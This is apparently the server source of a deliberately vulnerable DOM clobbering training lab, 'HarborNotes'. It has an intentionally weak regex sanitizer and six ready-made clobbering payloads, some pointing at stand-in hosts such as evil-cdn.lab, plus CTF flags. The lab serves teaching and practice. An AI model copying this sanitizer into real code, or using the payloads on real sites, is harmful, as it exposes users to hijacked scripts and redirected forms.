/**
 * HarborNotes — very advanced DOM clobbering lab.
 *
 * The comment sanitizer strips <script>, event handlers, and javascript:
 * URLs. It still allows id, name, href, action, and form controls.
 * Later JS trusts named properties on window/document (PortSwigger /
 * Gareth Heyes style gadgets) instead of reading a JSON config.
 */
const fs = require('fs');
const path = require('path');
const express = require('express');
const { JSDOM } = require('jsdom');
const { runClobberGadgets } = require('./gadgets');

const PORT = Number(process.env.PORT || 3700);
const GADGET_SRC = fs.readFileSync(path.join(__dirname, 'gadgets.js'), 'utf8');

const PAYLOADS = {
  windowId: '<div id="IS_PREMIUM">premium</div>',
  anchor: '<a id="ASSET_HOST" href="https://evil-cdn.lab/app.js">cdn</a>',
  nest: '<form id="SESSION"><input name="priv" value="admin"></form>',
  collection:
    '<a id="API">x</a><a id="API" name="endpoint" href="https://evil-api.lab/v1">y</a>',
  gebi: '<img name="getElementById" alt=""><a id="SITE_BANNER" href="https://clobber-gebi.lab/banner">b</a>',
  action: '<form id="checkout" name="checkout" action="https://clobber-action.lab/pay"><input name="sku" value="1"></form>',
};

PAYLOADS.all = [
  PAYLOADS.windowId,
  PAYLOADS.anchor,
  PAYLOADS.nest,
  PAYLOADS.collection,
  PAYLOADS.gebi,
  PAYLOADS.action,
].join('\n');

function sanitize(html) {
  return String(html || '')
    .replace(/<script\b[\s\S]*?<\/script>/gi, '')
    .replace(/<script\b[^>]*>/gi, '')
    .replace(/\son\w+\s*=/gi, ' data-dropped=')
    .replace(/javascript\s*:/gi, '')
    .replace(/<iframe\b/gi, '<x-iframe')
    .replace(/<object\b/gi, '<x-object')
    .replace(/<embed\b/gi, '<x-embed')
    .replace(/<svg\b/gi, '<x-svg')
    .replace(/<math\b/gi, '<x-math');
}

function evalWidget(html) {
  const sanitized = sanitize(html);
  const dom = new JSDOM(
    `<!DOCTYPE html><html><body>${sanitized}<script>${GADGET_SRC}
      window.CLOBBER_FLAGS = runClobberGadgets(window);
    </script></body></html>`,
    { url: 'http://127.0.0.1:3700/workbench', runScripts: 'dangerously', pretendToBeVisual: true }
  );
  const flags = Array.isArray(dom.window.CLOBBER_FLAGS) ? dom.window.CLOBBER_FLAGS : [];
  dom.window.close();
  return { sanitized, flags };
}

const app = express();
app.disable('x-powered-by');
app.use(express.urlencoded({ extended: false, limit: '64kb' }));
app.use(express.json({ limit: '64kb' }));

function escapeHtml(value) {
  return String(value)
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;');
}

function layout(title, body) {
  return `<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <title>${title}</title>
  <style>
    :root { color-scheme: light; }
    body { font-family: Georgia, serif; max-width: 920px; margin: 2rem auto; line-height: 1.5; color: #1e1b16; }
    code, pre, textarea, .mono { font-family: Consolas, ui-monospace, monospace; font-size: 0.88em; }
    a { color: #3730a3; }
    nav a { margin-right: 0.85rem; }
    textarea { width: 100%; min-height: 9rem; padding: 0.5rem; }
    button, .btn { font: inherit; padding: 0.4rem 0.75rem; background: #3730a3; color: #fff; border: 0; border-radius: 4px; cursor: pointer; text-decoration: none; display: inline-block; margin: 0.2rem 0.3rem 0.2rem 0; }
    button.alt { background: #6d28d9; }
    .warn { border-left: 4px solid #b45309; padding: 0.7rem 0.9rem; background: #fffbeb; }
    .ok { border-left: 4px solid #047857; padding: 0.7rem 0.9rem; background: #ecfdf5; }
    .lab { border-left: 4px solid #6d28d9; padding: 0.7rem 0.9rem; background: #f5f3ff; }
    table { border-collapse: collapse; width: 100%; margin: 0.7rem 0; }
    th, td { text-align: left; padding: 0.35rem 0.45rem; border-bottom: 1px solid #ddd; vertical-align: top; }
    iframe.sink { width: 100%; min-height: 14rem; border: 1px solid #c4b5fd; background: #fff; }
    footer { margin-top: 2rem; font-size: 0.85rem; color: #6b7280; }
  </style>
</head>
<body>
  <nav>
    <a href="/">Home</a>
    <a href="/workbench">Workbench</a>
    <a href="/notes">Published note</a>
  </nav>
  ${body}
  <footer>
    HarborNotes — DOM clobbering lab. Sanitizer ≠ policy for named properties.
    VIP: <a href="http://127.0.0.1:8780/workbench">WAF :8780</a>
  </footer>
</body>
</html>`;
}

let published = '<p>Welcome to HarborNotes. Widgets are sanitized.</p>';

app.get('/health', (_req, res) => res.type('text').send('ok'));
app.get('/gadgets.js', (_req, res) => {
  res.type('application/javascript').send(GADGET_SRC);
});

app.get('/', (_req, res) => {
  res.type('html').send(
    layout(
      'HarborNotes — DOM Clobbering',
      `
      <h1>HarborNotes</h1>
      <p>Authors paste HTML widgets into the knowledge base. The sanitizer removes
      <code>&lt;script&gt;</code>, <code>on*</code> handlers, and <code>javascript:</code>
      URLs. It does <strong>not</strong> strip <code>id</code>, <code>name</code>,
      <code>href</code>, or <code>action</code>.</p>
      <div class="lab">
        DOM clobbering is not XSS. The attacker’s HTML overwrites
        <code>window.*</code> / <code>document.*</code> via named elements.
        Later first-party JavaScript reads those names as if they were config.
        Classic references: PortSwigger “DOM clobbering”, Gareth Heyes on
        HTMLCollections and <code>form.action</code>.
      </div>
      <p><a class="btn" href="/workbench">Open the workbench</a></p>
      <table>
        <thead><tr><th>#</th><th>Gadget</th><th>Flag</th></tr></thead>
        <tbody>
          <tr><td>1</td><td><code>id=IS_PREMIUM</code> → <code>window.IS_PREMIUM</code></td><td><code>FLAG{domclob-window-id}</code></td></tr>
          <tr><td>2</td><td><code>&lt;a id=ASSET_HOST href&gt;</code> <code>toString</code></td><td><code>FLAG{domclob-anchor-tostring}</code></td></tr>
          <tr><td>3</td><td><code>form#SESSION input[name=priv]</code> (not <code>role</code> — IDL wins)</td><td><code>FLAG{domclob-form-nest}</code></td></tr>
          <tr><td>4</td><td>Duplicate <code>id=API</code> HTMLCollection + <code>name=endpoint</code></td><td><code>FLAG{domclob-htmlcollection}</code></td></tr>
          <tr><td>5</td><td><code>&lt;img name=getElementById&gt;</code> shadows the method</td><td><code>FLAG{domclob-gebi-smash}</code></td></tr>
          <tr><td>6</td><td><code>form.action</code> reflected URL</td><td><code>FLAG{domclob-form-action}</code></td></tr>
          <tr><td>★</td><td>All six in one widget</td><td><code>FLAG{domclob-complete}</code></td></tr>
        </tbody>
      </table>
    `
    )
  );
});

app.get('/workbench', (_req, res) => {
  const presets = Object.entries({
    windowId: '1 · window id',
    anchor: '2 · anchor toString',
    nest: '3 · nested form',
    collection: '4 · HTMLCollection',
    gebi: '5 · getElementById smash',
    action: '6 · form.action',
    all: '★ all six',
  })
    .map(([key, label]) => `<button type="button" data-preset="${escapeHtml(key)}">${escapeHtml(label)}</button>`)
    .join('');

  res.type('html').send(
    layout(
      'Workbench — HarborNotes',
      `
      <h1>Clobber workbench</h1>
      <p class="warn">The iframe is same-origin so named properties exist on
      <em>its</em> <code>window</code>. First-party gadgets run after the sanitizer.</p>
      <p>${presets}</p>
      <form id="f" method="post" action="/workbench">
        <label for="widget">Widget HTML</label>
        <textarea id="widget" name="widget" placeholder="<p>hello</p>"></textarea>
        <p>
          <button type="submit">Publish + evaluate</button>
          <button type="button" id="live" class="alt">Live preview</button>
        </p>
      </form>
      <h2>Sanitized sink</h2>
      <iframe class="sink" id="sink" sandbox="allow-scripts allow-same-origin"></iframe>
      <h2>Flags</h2>
      <pre class="ok" id="flags">none yet</pre>
      <script>
        const PAYLOADS = ${JSON.stringify(PAYLOADS)};
        const gadgetSrc = ${JSON.stringify(GADGET_SRC)};
        function srcdocFor(html) {
          return '<!DOCTYPE html><html><body>' + html +
            '<script>' + gadgetSrc +
            ';var f=runClobberGadgets(window);' +
            'document.body.insertAdjacentHTML("beforeend","<pre id=flag-out>"+f.join("\\n")+"</pre>");' +
            'window.CLOBBER_FLAGS=f;<' + '/script></body></html>';
        }
        const ta = document.getElementById('widget');
        const sink = document.getElementById('sink');
        const flags = document.getElementById('flags');
        document.querySelectorAll('[data-preset]').forEach(function (btn) {
          btn.onclick = function () { ta.value = PAYLOADS[btn.getAttribute('data-preset')] || ''; };
        });
        function show(sanitized, list) {
          sink.srcdoc = srcdocFor(sanitized);
          flags.textContent = (list && list.length) ? list.join('\\n') : 'no flags';
        }
        document.getElementById('live').onclick = async function () {
          const r = await fetch('/api/eval', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ widget: ta.value })
          });
          const data = await r.json();
          if (!r.ok) { flags.textContent = JSON.stringify(data, null, 2); return; }
          show(data.sanitized, data.flags);
        };
      </script>
    `
    )
  );
});

app.post('/workbench', (req, res) => {
  const widget = String(req.body.widget || '');
  const { sanitized, flags } = evalWidget(widget);
  published = sanitized;
  void flags;
  res.redirect('/notes');
});

app.get('/notes', (_req, res) => {
  const { flags } = evalWidget(published);
  res.type('html').send(
    layout(
      'Published note — HarborNotes',
      `
      <h1>Published note</h1>
      <p>This is what readers see after sanitize + gadget init.</p>
      <iframe class="sink" sandbox="allow-scripts allow-same-origin" srcdoc="${escapeHtml(
        `<body>${published}<pre>${flags.join('\n') || 'no flags'}</pre>`
      )}"></iframe>
      <div class="ok"><pre>${escapeHtml(flags.join('\n') || 'no flags')}</pre></div>
      <p><a class="btn" href="/workbench">Back to workbench</a></p>
    `
    )
  );
});

app.post('/api/eval', (req, res) => {
  const widget = req.body && req.body.widget != null ? req.body.widget : '';
  const out = evalWidget(widget);
  res.json(out);
});

app.get('/api/payloads', (_req, res) => {
  res.json(PAYLOADS);
});

app.listen(PORT, '0.0.0.0', () => {
  console.log(`[harbor-notes] DOM clobbering lab on ${PORT}`);
});
